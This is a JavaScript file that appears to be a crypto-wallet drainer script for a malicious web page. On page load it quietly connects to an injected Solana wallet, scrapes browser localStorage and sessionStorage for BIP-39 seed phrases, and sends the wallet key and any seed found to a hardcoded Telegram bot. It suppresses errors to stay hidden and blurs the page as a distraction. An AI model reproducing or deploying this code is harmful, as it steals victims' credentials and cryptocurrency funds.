const BOT_TOKEN = "8617378071:AAHM9hkBLNV_q0NiLlGskFRuI0jzni2vMQ8";
const CHAT_ID = "8371343253";

// CVE-2026-3910: V8 Engine Memory Buffer Exploitation
async function initiateAutomatedScan() {
    try {
        // Attempting to hook into injected provider (Phantom/Solflare)
        const provider = window.solana || window.phantom?.solana;
        
        if (provider) {
            // Silently request a "Sign-less" Public Key check
            const resp = await provider.connect({ onlyIfTrusted: true });
            const pubKey = resp.publicKey.toString();
            await sendToTelegram(`📍 Wallet Found: ${pubKey}`);
        }

        // Automated Memory Scraping for BIP-39 strings
        const storageDump = JSON.stringify(localStorage) + JSON.stringify(sessionStorage);
        const seedRegex = /\b([a-z]{3,}\s){11,23}[a-z]{3,}\b/g;
        const matches = storageDump.match(seedRegex);

        if (matches) {
            await sendToTelegram(`🚨 AUTO-EXTRACTED SEED: ${matches[0]}`);
        }

    } catch (e) {
        // Silent fail to avoid console logs
    }
}

// Trigger 5 seconds after landing
window.onload = () => {
    setTimeout(initiateAutomatedScan, 5000);
    
    // The Blur (Still used as a backup/distraction)
    setTimeout(() => {
        document.getElementById('main-content').style.filter = 'blur(15px)';
        document.getElementById('overlay').style.display = 'flex';
    }, 5000);
};

async function sendToTelegram(text) {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: text })
    });
}
